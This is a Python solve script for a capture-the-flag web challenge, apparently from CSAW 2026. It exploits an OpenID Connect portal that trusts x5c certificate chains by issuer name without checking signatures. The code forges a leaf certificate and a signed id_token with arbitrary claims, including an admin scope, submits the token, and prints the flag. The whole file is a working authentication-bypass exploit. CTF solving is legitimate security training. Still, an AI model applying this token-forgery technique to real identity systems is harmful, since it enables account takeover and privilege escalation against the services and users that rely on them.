#!/usr/bin/env python3
"""
TrustDinOIDC — CSAW CTF Quals 2026
Bug: the RP (portal) verifies id_token signatures against certs in the JWT `x5c`
header. For iss=paleoid it pins the exact cert, BUT for iss=strataid it only checks
that the leaf cert *chains by name* to the trusted PaleoID root — it never
cryptographically verifies the leaf was actually signed by that root, and it then
verifies the JWT using the (attacker-controlled) leaf's public key.

So we mint our own leaf cert (subject CN == iss == strataid.example.com,
issuer == PaleoID's subject), sign it with OUR key, present x5c=[our_leaf, real_paleo],
and sign the JWT with our key. We now control every claim, including `scope`.
Flagosaurus (admin) is unlocked by the `flagosaurus:redeem` scope, which the real
IdP's scope whitelist would never grant.

Flag: csaw{str4ta_sk1pped_th3_p1n}
"""
import requests, re, base64, json, datetime
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.x509 import load_der_x509_certificate

B  = "https://dino2auth.ctf.csaw.io"
CB = f"{B}/oauth/callback"

def b64u(o):
    if isinstance(o, (dict, list)): o = json.dumps(o, separators=(',', ':'))
    if isinstance(o, str): o = o.encode()
    return base64.urlsafe_b64encode(o).rstrip(b'=').decode()

# 1) Grab the real PaleoID root cert from a normal authorize response (it's the x5c[0]).
r = requests.get(f"{B}/idp/paleoid/authorize", params={
    "client_id": "trustdinoidc-portal", "redirect_uri": CB,
    "state": "x", "scope": "openid"})
tok = re.search(r'name="id_token" value="([^"]+)"', r.text).group(1)
hseg = tok.split('.')[0]; hseg += '=' * (-len(hseg) % 4)
paleo_der = base64.b64decode(json.loads(base64.urlsafe_b64decode(hseg))["x5c"][0])
paleo = load_der_x509_certificate(paleo_der)

# 2) Our own keypair + a forged leaf cert: subject CN = iss, issuer = PaleoID root name.
iss = "strataid.example.com"
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
leaf = (x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, iss)]))
        .issuer_name(paleo.subject)               # claim PaleoID issued us (it didn't)
        .public_key(key.public_key()).serial_number(12345)
        .not_valid_before(datetime.datetime(2026, 1, 1))
        .not_valid_after(datetime.datetime(2027, 1, 1))
        .sign(key, hashes.SHA256()))              # self-signed with OUR key

# 3) Build the id_token: x5c chain = [our leaf, real paleo], sign JWT with our key.
x5c = [base64.b64encode(leaf.public_bytes(serialization.Encoding.DER)).decode(),
       base64.b64encode(paleo_der).decode()]
header  = {"alg": "RS256", "typ": "JWT", "x5c": x5c}
payload = {"iss": iss, "sub": "curator", "aud": "trustdinoidc-portal",
           # scope is forged too -> flagosaurus:redeem unlocks the admin print
           "scope": "openid profile freeosaurus:redeem flagosaurus:redeem",
           "exp": 1900000000}
signing = f"{b64u(header)}.{b64u(payload)}"
sig = key.sign(signing.encode(), padding.PKCS1v15(), hashes.SHA256())
id_token = f"{signing}.{b64u(sig)}"

# 4) Submit to the callback (session cookie == the id_token), then load the portal.
s = requests.Session()
s.post(CB, data={"id_token": id_token, "state": "x"}, allow_redirects=False)
html = s.get(f"{B}/").text
print(re.search(r'csaw\{[^}]+\}', html).group())
